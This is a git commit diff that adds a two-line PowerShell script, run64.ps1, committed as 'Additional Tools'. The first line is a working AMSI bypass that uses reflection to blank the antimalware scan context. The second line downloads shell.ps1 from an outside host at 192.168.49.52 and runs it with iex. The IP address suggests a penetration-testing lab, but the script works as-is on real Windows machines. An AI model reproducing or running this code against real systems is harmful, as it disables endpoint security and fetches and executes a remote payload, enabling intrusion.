ac735cd18800038418d27e206688d1166ffe7388
Daniel Alicie <65047302+pilotguy0920@users.noreply.github.com>
2024-01-05 12:48:08 -0500

    Additional Tools

---
+++ run64.ps1
@@ -0,0 +1,2 @@
+$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
+iex (iwr http://192.168.49.52/shell.ps1 -useBasicParsing)
